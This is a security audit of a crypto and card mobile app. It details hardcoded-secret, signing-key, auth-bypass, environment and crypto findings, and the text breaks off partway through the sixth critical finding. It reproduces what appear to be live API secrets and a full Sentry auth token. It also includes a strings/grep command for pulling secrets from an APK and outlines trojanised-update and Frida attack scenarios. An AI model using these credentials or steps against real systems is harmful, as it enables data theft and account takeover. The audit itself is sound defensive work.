# ExchangaPay Mobile Application — Security, VAPT & Performance Audit

| Field | Value |
|---|---|
| **Application** | `exchangapay` (Exchanga Pay) |
| **Type** | Fintech — crypto wallet, prepaid/debit cards, fiat statements, KYC/AML |
| **Platform** | React Native `0.83.6` / React `19.2.0` / Hermes / New Architecture enabled |
| **Branch audited** | `rn-0.83-upgrade` @ `5f38f42` |
| **Android package** | `com.exchangapay.tst` (targetSdk 35, minSdk 24) |
| **iOS bundle** | `exchangapay` (Swift AppDelegate, RN 0.83 factory) |
| **Codebase size** | ~53,261 LOC under `src/`, 12 service modules, ~120 screens |
| **Audit date** | 2026-08-03 |
| **Methodology** | Static source review, configuration review, dependency/CVE analysis, VAPT-style threat modelling against OWASP MASVS v2 / OWASP Mobile Top 10 (2024) |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Critical Findings (C-01 … C-08)](#2-critical-findings)
3. [High Findings (H-01 … H-15)](#3-high-findings)
4. [Medium Findings (M-01 … M-16)](#4-medium-findings)
5. [Low / Informational Findings](#5-low--informational-findings)
6. [VAPT Assessment](#6-vapt-assessment)
7. [API Security Audit](#7-api-security-audit)
8. [Android Security Review](#8-android-security-review)
9. [iOS Security Review](#9-ios-security-review)
10. [React Native Performance Audit](#10-react-native-performance-audit)
11. [Architecture & Code Quality](#11-architecture--code-quality)
12. [Dependency Audit](#12-dependency-audit)
13. [DevOps & CI/CD Security](#13-devops--cicd-security)
14. [Compliance & Best Practices](#14-compliance--best-practices)
15. [Recommendations & Remediation Roadmap](#15-recommendations--remediation-roadmap)
16. [Final Scoring](#16-final-scoring)

---

## 1. Executive Summary

### 1.1 Overall App Health

ExchangaPay is a feature-rich fintech application handling **custodial crypto balances, card issuance, card PAN/PIN display, fiat statements, and full KYC/PII**. The RN 0.83 upgrade work is competent — the New Architecture is enabled, Hermes is on, native `quick-crypto` replaced pure-JS `crypto-js` on the hot path, and a decrypt memoisation cache was added. The build tooling (CMake/NDK pinning, Jetifier retention, patch-package) is well-documented.

That engineering quality is **not matched by the security posture**. The application in its current state is **not fit for production release** in a regulated financial context. The audit identified **8 Critical**, **15 High**, **16 Medium**, and 20+ Low/Informational findings.

The single most severe issue is not any one bug but a **systemic failure of secrets management**: live third-party HMAC secrets, a Sentry organisation auth token, a valid production-issuer JWT, Auth0 client identifiers, Firebase configs, and the app's release signing key are all committed to version control in plaintext. Anyone with repository read access — or anyone who decompiles a shipped APK — obtains them.

### 1.2 Security Posture

| Control Domain | Status | Notes |
|---|---|---|
| Secrets management | ❌ **Absent** | No `.env`, no secret manager, no CI secret injection. Secrets are literals in source. |
| Transport security | ⚠️ **Partial** | HTTPS enforced by default; **no certificate pinning**; `network_security_config.xml` written but never wired into the manifest. |
| Data-at-rest | ⚠️ **Partial** | Keychain/Keystore used for tokens, but with default (weakest) accessibility, no biometric binding, and the redux-persist encryption transform is **commented out**. |
| Authentication | ⚠️ **Weak** | Auth0 OIDC is sound in principle, but a hardcoded-JWT "temp login" path and a client-side-only biometric gate undermine it. |
| Authorisation | ❌ **Client-enforced** | KYC state, account state, and role gating are all navigation decisions in JS. |
| Anti-tampering | ❌ **Absent** | No root/jailbreak detection, no Play Integrity, no DeviceCheck/App Attest, no emulator detection, no debugger detection. |
| Code protection | ❌ **Absent** | ProGuard/R8 disabled, empty rules file, no obfuscation, no bundle hardening. |
| Logging hygiene | ❌ **Dangerous** | Bearer tokens and full request/response bodies shipped to Crashlytics; Sentry session replay + PII enabled. |
| Screen/clipboard protection | ❌ **Absent** | No `FLAG_SECURE`, no iOS snapshot blur, no clipboard TTL on card/wallet data. |
| Dependency hygiene | ❌ **Poor** | 21 known vulnerabilities (11 High); multiple unmaintained and duplicated libraries. |

### 1.3 Performance Maturity

Performance is **mid-tier**. The recent native-crypto migration and decrypt cache are genuine wins. But the app eagerly imports **~120 screen modules** into a single navigator at startup, ships **three separate charting libraries** and **two date libraries**, and has **zero** `FlatList` virtualisation tuning across 12 lists. Several screens exceed 2,000 lines with heavy inline work. Startup time, memory footprint, and list scroll on low-end Android are the primary risks.

### 1.4 Critical Findings Summary

| ID | Finding | CVSS-ish | Domain |
|---|---|---|---|
| **C-01** | Live Kommo HMAC secret + channel/account IDs hardcoded in shipped JS | 9.1 | Secrets |
| **C-02** | Sentry organisation auth token committed to repo | 9.1 | Secrets / Supply chain |
| **C-03** | **Release builds signed with the committed debug keystore** | 9.8 | Build integrity |
| **C-04** | Hardcoded production-issuer JWT + authentication-bypass fallback | 9.3 | AuthN |
| **C-05** | `getAllEnvData()` hard-returns the **test** environment for every build | 8.6 | Config |
| **C-06** | Static AES-128 key `"8080808080808080"` used as **both key and IV** | 8.2 | Cryptography |
| **C-07** | Bearer token + full request/response bodies sent to Crashlytics | 8.8 | Data exposure |
| **C-08** | ProGuard/R8 disabled; empty rules file; no obfuscation | 7.5 | Reverse engineering |

### 1.5 Risk Summary

> **Overall Risk Rating: 🔴 CRITICAL — Do Not Ship**

**Aggregate business risk.** An attacker who obtains the APK (trivially, from any distribution channel) can extract the release signing key, the Kommo support-channel HMAC secret, Auth0 client IDs, and the Sentry token. The debug keystore is publicly known — its password is literally `android` and it ships with the Android SDK — which means **anyone can produce a signed build that Android and any sideload channel will accept as an update to this app**. Combined with the absence of certificate pinning and root detection, a compromised or attacker-controlled device offers complete visibility into, and manipulation of, the authenticated API session for a custodial crypto and card platform.

**Regulatory exposure.** In its current state the app would fail: OWASP MASVS-L1 (multiple controls), PCI-DSS mobile guidance (card PAN/PIN displayed with no screenshot or screen-recording protection, no anti-tamper), and would present significant difficulty in a GDPR context (PII and bearer tokens exported to two third-party telemetry processors, session replay enabled).

**Recommended action.** Freeze release. Execute the [Immediate Fixes](#151-immediate-fixes-0-72-hours) block (rotate all exposed credentials, generate a real release keystore, remove the hardcoded JWT path) before any further feature work.

---

## 2. Critical Findings

---

### C-01 — Live Kommo HMAC Secret and Channel Credentials Hardcoded in Shipped JavaScript

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-321 (Hard-coded Cryptographic Key) |
| **MASVS** | MASVS-STORAGE-1, MASVS-CRYPTO-1 |
| **OWASP Mobile Top 10** | M1 — Improper Credential Usage |
| **Files** | [src/screens/Chatbot/chatscreen.tsx:44-48](src/screens/Chatbot/chatscreen.tsx#L44-L48), [src/services/chatService.js:184](src/services/chatService.js#L184) |

#### Technical Explanation

The Kommo (amoCRM) support-chat integration embeds its API secret directly in the React Native bundle, in two independent places:

```tsx
// src/screens/Chatbot/chatscreen.tsx:44-48
const config = {
    secretKey: '60d0c569acef691e8c11f4db628152b5aaa3ab4a',
    channelId: '30778ba5-1242-4603-b38d-376e358ee595',
    accountId: 'e393e15b-d500-4eb5-8a0f-45e41b875cc5'
};
```

```js
// src/services/chatService.js:184  — a second, duplicated copy
const secret = '60d0c569acef691e8c11f4db628152b5aaa3ab4a';
```

This secret is the HMAC-SHA1 signing key for every Kommo Chat API request (`generateHeaders()` at [src/services/chatService.js:34-59](src/services/chatService.js#L34-L59)). It authenticates the **application as a whole** to Kommo — it is a server-class credential that has been placed on the client.

Because Hermes bytecode is trivially decompilable and the string survives as a plain UTF-8 literal, extraction requires no more than `strings` on the bundle or a `grep` of an unpacked APK. There is no obfuscation to slow this down (see [C-08](#c-08--proguardr8-disabled-no-code-obfuscation)).

#### Attack Scenario

1. Attacker downloads the APK (Play Store, sideload site, or an internal build from the GitHub Releases pipeline described in [§13](#13-devops--cicd-security)).
2. `unzip app.apk && strings assets/index.android.bundle | grep -E '[a-f0-9]{40}'` yields the secret in seconds.
3. Attacker now holds the channel signing key. Using `connectChannel()` semantics they can:
   - **Impersonate any customer** in the support channel — `createChat()` accepts an arbitrary `user.id`, `name`, `email`, and `phone` supplied by the caller, all of which the client controls.
   - **Read arbitrary conversation histories** via `sendSignedGetRequest()`, which signs `GET /v2/origin/custom/{scopeId}/chats/{conversation_id}/history`. `conversation_id` is the customer's `userInfo.id`. An attacker who can enumerate or guess customer IDs reads every support conversation on the platform.
   - **Inject messages** appearing to originate from a legitimate customer, or (depending on Kommo's channel model) craft social-engineering content delivered through a trusted in-app channel.
4. Support conversations in a fintech context routinely contain transaction IDs, wallet addresses, partial card data, identity documents, and account-recovery discussion — a rich source for follow-on account takeover.

#### Risk Impact

- **Confidentiality:** Full disclosure of all customer support conversations, including any PII/financial data shared in them.
- **Integrity:** Attacker-authored messages attributable to real customers; support agents may act on forged instructions (e.g. "please unfreeze my card", "change my registered address").
- **Reputation/Regulatory:** Mass disclosure of customer communications is a reportable data breach under GDPR Art. 33.

#### Exploitation Possibility

**Trivial.** No authenticated account required, no reverse-engineering skill beyond `unzip` and `grep`, no rate-limiting obstacle. The secret is static and, absent rotation, permanently valid.

#### Recommended Fix

1. **Rotate the Kommo secret immediately.** Treat it as fully compromised — assume it has been public for the lifetime of every build containing it.
2. **Move all Kommo signing server-side.** The mobile client must never hold the channel secret. Introduce a backend endpoint, e.g. `POST /api/v1/Support/Chat/Message` and `GET /api/v1/Support/Chat/History`, which:
   - authenticates the caller with the existing bearer token,
   - derives `conversation_id` from the **server-side** session identity, never from a client-supplied value,
   - performs the HMAC signing and proxies to `amojo.kommo.com`.
3. **Delete `src/services/chatService.js`** from the client and replace `KommoChatAPI` usage in `chatscreen.tsx` with calls to the new proxy endpoints.
4. **Purge from git history** — rotation alone is insufficient if the repo is ever made public or a contributor's access is revoked. Use `git filter-repo` or BFG, then force-push and re-clone all working copies.

#### Best Practice Recommendation

Adopt the invariant: *a mobile client is a public, untrusted binary*. Any credential that grants privileges beyond the currently authenticated user must live only on a server. Client-side secrets are acceptable only when they are per-user, short-lived, and independently authorised server-side (e.g. the Sumsub access token pattern already used correctly at [src/components/sumsub.tsx:84](src/components/sumsub.tsx#L84)).

---

### C-02 — Sentry Organisation Auth Token Committed to the Repository

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-798, CWE-540 (Inclusion of Sensitive Information in Source Code) |
| **MASVS** | MASVS-STORAGE-1 |
| **OWASP Mobile Top 10** | M1 — Improper Credential Usage |
| **File** | [ios/sentry.properties:2](ios/sentry.properties#L2) |

#### Technical Explanation

```properties
auth.token=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
defaults.org=exchangapay
defaults.project=exchangapay
```

The file is **tracked in git** (confirmed via `git ls-files`). The `sntrys_` prefix denotes a Sentry organisation auth token. Its embedded, base64-decodable payload confirms `"org":"exchangapay"` and the US region endpoint. These tokens are used by `sentry-cli` for source-map and debug-symbol upload during the iOS build phase, and typically carry broad scopes (`project:releases`, `org:read`, and frequently `project:write`).

Additionally the runtime DSN is duplicated as a literal in [Environment.js:29](Environment.js#L29) and [Environment.js:49](Environment.js#L49) — DSNs are less sensitive (they are write-only ingest keys by design) but their presence alongside the auth token confirms no secret-handling discipline exists in this project.

#### Attack Scenario

1. Attacker gains read access to the repository — via a compromised developer account, an over-permissive fork, an accidental public push, a leaked CI log, or simply being a former contributor whose access was revoked *after* the token was committed (revocation of repo access does not revoke a token they already copied).
2. Using the token with `sentry-cli` or the Sentry API, the attacker can:
   - **Read every crash report and error event** in the `exchangapay` org. Given [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), these events contain API request and response bodies. Given `sendDefaultPii: true` and session replay ([H-08](#h-08--sentry-session-replay-and-pii-collection-enabled)), they contain user identifiers, IP addresses, and recorded UI sessions.
   - **Download uploaded source maps**, fully de-minifying the JS bundle and handing the attacker readable source for the entire application.
   - **Upload forged releases or tamper with existing ones**, poisoning incident-response data.
3. The token is long-lived; unless explicitly rotated it remains valid indefinitely.

#### Risk Impact

- **Confidentiality:** Complete read access to production error telemetry — which, per C-07 and H-08, is a superset of authenticated API traffic and user session recordings for affected users.
- **Supply chain:** Source-map access accelerates every other attack in this report by removing the (already minimal) reverse-engineering barrier.
- **Integrity:** Ability to corrupt the observability pipeline the team relies on to detect incidents.

#### Exploitation Possibility

**High** for anyone with repo access (current or historical). The token requires no additional pivot — it is directly usable against `sentry.io`.

#### Recommended Fix

1. **Revoke the token now** in Sentry → Settings → Auth Tokens. Issue a replacement scoped to the minimum required (`project:releases` only) as an **organisation token**, not a personal one.
2. **Remove `ios/sentry.properties` from git** and add it to `.gitignore`. Supply the token to builds via environment variable instead — `sentry-cli` reads `SENTRY_AUTH_TOKEN` natively, so the properties file only needs `defaults.org` / `defaults.project` (which are not secret).
3. **Purge from git history** (BFG / `git filter-repo`), as with C-01.
4. **Audit Sentry access logs** for the token's usage since `iat` (1761374749 → 2025-10-25) to determine whether it has already been used from unexpected locations.

#### Best Practice Recommendation

`.gitignore` should treat `*.properties`, `*.keystore`, `*.jks`, `.env*`, and `*Service-Info.plist` as deny-by-default. Add a pre-commit secret scanner (`gitleaks`, `trufflehog`, or GitHub's native push protection) so this class of finding is caught at commit time rather than at audit time.

---

### C-03 — Release Builds Are Signed With the Committed Debug Keystore

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-798, CWE-321, CWE-1188 (Insecure Default Initialization) |
| **MASVS** | MASVS-RESILIENCE-1 |
| **OWASP Mobile Top 10** | M8 — Security Misconfiguration |
| **Files** | [android/app/build.gradle:104-122](android/app/build.gradle#L104-L122), `android/app/debug.keystore` (tracked in git) |

#### Technical Explanation

```gradle
signingConfigs {
    debug {
        storeFile file('debug.keystore')
        storePassword 'android'
        keyAlias 'androiddebugkey'
        keyPassword 'android'
    }
}
buildTypes {
    debug {
        signingConfig signingConfigs.debug
    }
    release {
        // Caution! In production, you need to generate your own keystore file.
        signingConfig signingConfigs.debug   // ← release signed with DEBUG key
        minifyEnabled enableProguardInReleaseBuilds
        proguardFiles getDefaultProguardFile("proguard-android.txt"), "proguard-rules.pro"
    }
}
```

Three compounding problems:

1. **The `release` build type uses `signingConfigs.debug`.** The RN template's own warning comment is still present and has been ignored.
2. **`debug.keystore` is committed to the repository** (confirmed via `git ls-files`) — notably, `.gitignore` *does* list `android/app/debug.keystore`, but the file was tracked before that rule was added, so the ignore rule has no effect on an already-tracked file.
3. **The credentials are the Android SDK universal defaults** — store password `android`, alias `androiddebugkey`, key password `android`. This keystore is not merely leaked; it is the *same keystore shipped to every Android developer on earth* unless it was regenerated (and it is committed, so its exact bytes are known regardless).

Critically, the deleted release workflow (see [§13](#13-devops--cicd-security)) generated **public GitHub Releases** of this APK, with the changelog line *"Signed with the debug keystore — internal testing only, not Play Store ready."* The awareness existed; the control did not.

#### Attack Scenario

**Scenario A — Malicious update / app replacement.**
1. Attacker obtains any released APK and extracts the signing certificate, or simply pulls `debug.keystore` from the repo (or uses their own local copy of the SDK's default debug keystore).
2. Attacker builds a trojanised version of ExchangaPay — adding a keylogger over the PIN entry screen, exfiltrating the Keychain-held bearer token, or rewriting the withdrawal `walletAddress` field before submission.
3. Attacker signs it with the same key. **Android's update-integrity check passes**, because signature identity matches. The malicious build installs *as an update over the legitimate app*, inheriting its data directory, its Keychain/Keystore entries, and its user trust.
4. Distribution via any sideload channel, a phishing SMS ("update required"), or a third-party app store — all of which this app's own [ForceUpdate](src/screens/UpdateScreens/ForceUpdate.tsx) flow conditions users to comply with.

**Scenario B — Permanent loss of release channel.** If the app is ever published to Google Play with this key, the signing identity can never be changed for that listing without Play App Signing key rotation (limited) or publishing an entirely new listing and migrating every user.

**Scenario C — Debug-build side effects.** Debug-signed builds are also `debuggable` in many toolchain configurations, permitting `adb` attachment, Frida injection without root, and full runtime memory inspection — see [VAPT-08](#vapt-08--runtime-manipulation).

#### Risk Impact

- **Integrity:** Complete. An attacker can produce builds that are cryptographically indistinguishable from official ones, targeting a custodial crypto and card platform.
- **Availability/Business continuity:** Publishing under a debug key is effectively irreversible for a Play listing.
- **Financial:** Direct path to fund theft via a trojanised withdrawal flow.

#### Exploitation Possibility

**Trivial and universally available.** The debug keystore credentials are public knowledge, documented in Android's own developer guides.

#### Recommended Fix

1. **Generate a real release keystore**, offline, with a strong passphrase:
   ```bash
   keytool -genkeypair -v -keystore exchangapay-release.jks \
     -keyalg RSA -keysize 4096 -validity 10000 -alias exchangapay
   ```
2. **Never commit it.** Store the keystore in a secrets manager (HashiCorp Vault, AWS Secrets Manager, or GitHub Actions encrypted secrets as base64) and materialise it only inside the CI runner.
3. **Split the signing config:**
   ```gradle
   signingConfigs {
       debug { /* unchanged, debug only */ }
       release {
           storeFile     file(System.getenv("EXCHANGA_KEYSTORE_PATH") ?: "dummy.jks")
           storePassword System.getenv("EXCHANGA_KEYSTORE_PASSWORD")
           keyAlias      System.getenv("EXCHANGA_KEY_ALIAS")
           keyPassword   System.getenv("EXCHANGA_KEY_PASSWORD")
       }
   }
   buildTypes {
       release {
           signingConfig signingConfigs.release
           minifyEnabled true          // see C-08
           shrinkResources true
           proguardFiles getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro"
       }
   }
   ```
4. **Enrol in Google Play App Signing** so Google holds the ultimate signing key and the upload key can be rotated if compromised.
5. **`git rm --cached android/app/debug.keystore`** and purge it from history.
6. **Invalidate every previously distributed build.** Any APK signed with the debug key must be treated as untrusted; use the existing `neoMobileVersioncheck` force-update mechanism ([App.tsx:118](App.tsx#L118)) to push all users onto a properly signed build once one exists.

#### Best Practice Recommendation

Signing keys should be non-exportable, held by CI/secret storage only, with release builds reproducible from a tagged commit and no human ever handling the key material. Enable Play Integrity API verdicts server-side ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)) so the backend can independently confirm requests originate from a genuinely-signed, unmodified binary — this is the control that would blunt Scenario A even if a key leaked again.

---

### C-04 — Hardcoded Production-Issuer JWT and Authentication-Bypass Fallback

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-798, CWE-489 (Active Debug Code), CWE-287 (Improper Authentication) |
| **MASVS** | MASVS-AUTH-1, MASVS-CODE-4 |
| **OWASP Mobile Top 10** | M1 — Improper Credential Usage, M8 — Security Misconfiguration |
| **File** | [src/screens/SplashScreen.tsx:175-250](src/screens/SplashScreen.tsx#L175-L250) |

#### Technical Explanation

`SplashScreen.tsx` contains a function `onTempLoginPress()` that bypasses the entire Auth0 authorisation flow using a **hardcoded, real JWT**:

```tsx
// Temporary login function using provided JWT token
const onTempLoginPress = async () => {
    const tempCredentials = {
      accessToken:
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IlRyQndlTVdEbzdMLTIwLUhMNGVPdSJ9.eyJlY29kZSI6...",
      refreshToken: null,
      idToken: null,
      expiresIn: 86400,
      tokenType: "Bearer",
    };
    await storeToken(tempCredentials.accessToken, tempCredentials.refreshToken);
    await restoreUserSession(tempCredentials, true);
```

Decoding the token's payload confirms it is a genuine credential, not a placeholder:

| Claim | Value |
|---|---|
| `iss` | `https://exchangapay-tst.eu.auth0.com/` |
| `sub` | `auth0\|adcbc03f-bf36-4327-b11b-8c9235d5fbb6` |
| `aud` | `["https://ExchangaTstApi.net", "https://exchangapay-tst.eu.auth0.com/userinfo"]` |
| `scope` | `openid profile email offline_access` |
| `exp` | 1758449065 (expired) |
| `ecode` / `idc` / `idr` | Base64 custom claims — encrypted customer identifiers |

Combined with [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build), `aud: https://ExchangaTstApi.net` is precisely the audience **every build of this app currently targets** — this token was minted for the same environment the production binary talks to.

**The fallback is worse than the token.** When the API call with this token fails, the `catch` block does not fail closed — it **fabricates an authenticated, fully-KYC-approved user and navigates into the Dashboard**:

```tsx
} catch (e) {
  console.error("Temporary login failed:", e);
  try {
    dispatch(isLogin(true));
    dispatch(setUserInfo({
        role: "Customer",
        isEmailVerified: true,
        isPhoneNumberVerified: true,
        isKYC: true,
        customerState: "Approved",
        isCustomerReferralCode: true,
        customerKycRequiredorNot: false,
        isReferralRequiredOrNot: false,
        isPhoneNumberverfiyWhileSignup: false,
        isSumsubKyc: false,
    }));
    navigation?.dispatch(CommonActions.reset({ index: 1, routes: [{ name: "Dashboard" }] }));
```

This is a deliberate, code-resident bypass of **every** onboarding gate the application implements: email verification, phone verification, referral requirement, Sumsub KYC, and customer-state approval — all of which are enforced only in `useMemberLogin.getMemDetails()` ([src/hooks/useMemberLogin.tsx:88-180](src/hooks/useMemberLogin.tsx#L88-L180)) as client-side navigation decisions.

#### Attack Scenario

**Scenario A — Reachable UI trigger.** If `onTempLoginPress` is bound to any rendered control (even one hidden behind a conditional, a long-press, or a build flag), an attacker who discovers it via bundle inspection gets an authenticated session with zero credentials.

**Scenario B — Runtime invocation.** With no root detection ([H-04](#h-04--no-rootjailbreak-detection-or-device-attestation)), no obfuscation ([C-08](#c-08--proguardr8-disabled-no-code-obfuscation)), and a debug-signed binary ([C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)), an attacker attaches Frida and calls `onTempLoginPress()` directly, or simply patches the bundle to invoke it on mount.

**Scenario C — Client-side authorisation bypass (the systemic issue).** Even without the temp-login path, the fallback demonstrates that **`setUserInfo` is the only thing standing between a user and the Dashboard**. An attacker hooking the Redux store — or patching the `getMemDetails` response — can set `isKYC: true, customerState: "Approved"` and enter the authenticated UI regardless of their real backend state. Whether they can then *transact* depends entirely on whether the backend re-validates KYC on every financial endpoint. **This must be verified server-side; the client provides no protection.**

**Scenario D — Token analysis.** Even expired, the token discloses the Auth0 tenant structure, the custom claim schema (`ecode`, `idc`, `idr`), the signing `kid`, and a real customer `sub` — all useful reconnaissance for forging or replaying credentials.

#### Risk Impact

- **Authentication:** Complete bypass on the client. Full UI access without credentials.
- **Authorisation:** Demonstrates that KYC/AML gating is client-enforced — a direct AML compliance concern for a regulated crypto/card issuer.
- **Confidentiality:** Leaked customer `sub` and encrypted-claim structure.

#### Exploitation Possibility

**High.** Scenario A requires only that the button exist. Scenarios B/C require modest tooling that this app makes no attempt to resist.

#### Recommended Fix

1. **Delete `onTempLoginPress` entirely**, including the hardcoded token and the entire `catch` fallback block. There is no safe version of this function.
2. **Revoke the token's session** in Auth0 and invalidate the `sub`'s refresh tokens.
3. **Make every failure path fail closed.** Replace the fallback with a navigation to the login screen and an error surface — never with fabricated user state:
   ```tsx
   } catch (e) {
     await clearPersistedState();
     setError("Sign-in failed. Please try again.");
   }
   ```
4. **Enforce KYC/AML server-side.** Every financial endpoint (`ExchangeTransaction/Deposit/TopUp`, `ExchangeTransaction/Withdraw/Crypto`, card issuance, statement export) must independently verify the caller's `isKYC` and `customerState` from the backend's own record, derived from the bearer token's `sub` — never from a client-supplied field. The client's navigation gating is UX, not security.
5. **Add a CI gate** that fails the build on JWT-shaped literals:
   ```bash
   grep -rEn 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}' src/ && exit 1
   ```

#### Best Practice Recommendation

Test/QA login shortcuts must be excluded at build time, not merely left unbound — use a `__DEV__` guard *and* a separate build flavour so the code is stripped from release bundles by dead-code elimination. Better still, use a dedicated staging Auth0 tenant with test users, so no shortcut is ever needed.

---

### C-05 — `getAllEnvData()` Hard-Returns the Test Environment for Every Build

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-1188 (Insecure Default Initialization), CWE-489 (Active Debug Code) |
| **MASVS** | MASVS-CODE-4 |
| **OWASP Mobile Top 10** | M8 — Security Misconfiguration |
| **File** | [Environment.js:68-74](Environment.js#L68-L74) |

#### Technical Explanation

```js
export const getAllEnvData = (envName) => {
  return ENV["tst"] || ENV.prod;      // ← envName is accepted and then ignored
};

export const getEnvVars = () => {
  return __DEV__ ? ENV.local : ENV.prod;   // ← ENV.local does not exist
};
```

`getAllEnvData` takes an `envName` parameter, **discards it**, and unconditionally returns the `tst` configuration. Since `ENV["tst"]` is always truthy, the `|| ENV.prod` fallback is dead code. Every call site is affected regardless of what it passes:

| Call site | Argument passed | Actually receives |
|---|---|---|
| [App.tsx:40](App.tsx#L40) — Sentry init + Auth0Provider | *(none)* | `tst` |
| [App.tsx:158](App.tsx#L158) — `getoAuthConfig` | `"tst"` | `tst` |
| [src/utils/ApiService.ts:116](src/utils/ApiService.ts#L116) — **API base URL** | `"prod"` | `tst` |
| [src/screens/SplashScreen.tsx:143](src/screens/SplashScreen.tsx#L143) — Auth0 scope/audience | `"prod"` | `tst` |
| [src/utils/helpers/index.tsx:~915](src/utils/helpers/index.tsx#L915) — token refresh | *(none)* | `tst` |
| [src/hooks/useSendUserWebhook.tsx:12](src/hooks/useSendUserWebhook.tsx#L12) | *(none)* | `tst` |

The consequence is that **a production release of this app authenticates against `exchangapay-tst.eu.auth0.com` and sends all API traffic to `https://tstapi.exchangapay.com/`.** This is corroborated independently by:
- `applicationId "com.exchangapay.tst"` and `namespace "com.exchangapay.tst"` ([android/app/build.gradle:99-101](android/app/build.gradle#L99-L101))
- `manifestPlaceholders = [auth0Domain: "exchangapay-tst.eu.auth0.com", ...]` ([android/app/build.gradle:107](android/app/build.gradle#L107))
- Firebase `project_id: "exchangapay-tst-f570a"` in both `google-services.json` and `GoogleService-Info.plist`
- `const ENV = "tst"` at [src/utils/helpers/index.tsx:728](src/utils/helpers/index.tsx#L728), which selects **mainnet** crypto address regexes while the environment is nominally test — an inconsistency in its own right
- `scope.setTag('environment', "development")` hardcoded at [src/utils/ApiService.ts:38](src/utils/ApiService.ts#L38) and [:84](src/utils/ApiService.ts#L84)

There is no build-time environment selection mechanism anywhere in the project — no `.env`, no `react-native-config`, no product flavours, no Xcode configurations beyond Debug/Release.

Note also `getEnvVars()` references `ENV.local`, which **is not defined** — that function returns `undefined` in debug builds. It appears unused, but it is exported and would fail at runtime if called.

#### Attack Scenario

1. A build reaches customers (via the GitHub Releases APK pipeline, TestFlight, or a store listing) believing it is production.
2. Real customers register, complete Sumsub KYC with **genuine identity documents**, and enter real personal data — all of which lands in the **test** backend, test Auth0 tenant, and test Firebase project.
3. Test environments characteristically have: weaker access controls, broader developer access, less log hygiene, no data-retention enforcement, non-production backup policies, and often permissive CORS/debug endpoints. Real KYC documents (passports, national IDs, proof of address) in such an environment is a severe data-protection failure.
4. Conversely, if any user *believes* they are on production and funds an account, they may transact against test-environment balances — or against real ones if the "test" API is in fact wired to production ledgers, which is a separate and equally serious possibility that must be confirmed.
5. **The mainnet address regexes** ([src/utils/helpers/index.tsx:730-736](src/utils/helpers/index.tsx#L730-L736)) mean the app accepts **real mainnet BTC/ETH/TRON/SOL addresses** while pointed at a test backend — creating a genuine risk of real-value withdrawals being initiated against, or lost within, a non-production system.

#### Risk Impact

- **Regulatory:** Real KYC/PII processed in a non-production environment — GDPR Art. 5(1)(f) and Art. 32 failure; likely breach of the firm's own AML data-handling policy.
- **Financial:** Ambiguity about which ledger real withdrawals hit, with mainnet addresses accepted.
- **Operational:** Production incidents are invisible in production telemetry, since Sentry is tagged `environment: "development"` and `sentryLoggs: false` on the `prod` config anyway (so **production error reporting is disabled entirely** — see [M-12](#m-12--production-error-reporting-effectively-disabled)).

#### Exploitation Possibility

Not an *attack* so much as a **latent misconfiguration with certain impact**. It requires no attacker — it is the current behaviour of every build.

#### Recommended Fix

1. **Fix the function to honour its parameter, with a safe default:**
   ```js
   const ENV_NAME = process.env.APP_ENV || "prod";   // injected at build time
   export const getAllEnvData = (envName) => ENV[envName || ENV_NAME] || ENV.prod;
   ```
2. **Introduce real build-time environment selection.** Use `react-native-config` with per-environment `.env` files (git-ignored), plus:
   - **Android:** product flavours (`dev`, `tst`, `prod`) each with its own `applicationId` suffix, `manifestPlaceholders`, and `google-services.json` under `android/app/src/<flavour>/`.
   - **iOS:** separate build configurations and schemes, each with its own `GoogleService-Info.plist` and bundle identifier.
3. **Remove all hardcoded environment strings**: `const ENV = "tst"` in helpers, `environment: "development"` in the Sentry/Crashlytics tags, and the `"tst"`/`"prod"` literals passed to `getAllEnvData`.
4. **Delete the broken `getEnvVars()`** or define `ENV.local`.
5. **Add a release-gate assertion** that fails the production build if the resolved API base URL matches `/dev|tst|staging/`.
6. **Immediately determine whether real customer KYC data currently resides in the test environment.** If so, this is a notifiable incident — engage your DPO.

#### Best Practice Recommendation

Environment configuration should be *impossible* to get wrong at runtime: resolved once at build time, asserted in CI, and visibly surfaced in-app (e.g. a non-production watermark on any non-prod build) so that a mis-targeted build is obvious to the first person who opens it.

---

### C-06 — Static AES-128 Key Used as Both Key and IV for Registration Encryption

| | |
|---|---|
| **Severity** | 🔴 **CRITICAL** |
| **CWE** | CWE-321 (Hard-coded Cryptographic Key), CWE-329 (Generation of Predictable IV in CBC Mode), CWE-1204 (Generation of Weak Initialization Vector) |
| **MASVS** | MASVS-CRYPTO-1, MASVS-CRYPTO-2 |
| **OWASP Mobile Top 10** | M10 — Insufficient Cryptography |
| **File** | [src/utils/tools.js:40-49](src/utils/tools.js#L40-L49) |

#### Technical Explanation

```js
const REGISTER_KEY = "8080808080808080";

export const encryptForRegister = (msg) => {
  const key = Buffer.from(REGISTER_KEY, "utf8");
  const iv  = Buffer.from(REGISTER_KEY, "utf8");     // ← IV === KEY
  const cipher = QuickCrypto.createCipheriv("aes-128-cbc", key, iv);
  return Buffer.concat([cipher.update(msg, "utf8"), cipher.final()]).toString("base64");
};
```

Four independent cryptographic failures in nine lines:

1. **Hardcoded key.** `"8080808080808080"` is a 16-byte ASCII literal in the shipped bundle. It is not derived, not per-user, not rotatable.
2. **Extremely low-entropy key.** The string is a repetition of `"80"` — even without extracting it from the binary, it sits in every rainbow table and would fall to a trivial dictionary attack on the first guess.
3. **IV equals the key.** CBC requires an IV that is unpredictable per message. Here it is not only predictable, it is the key itself — leaking key material into a value that is conventionally transmitted in the clear.
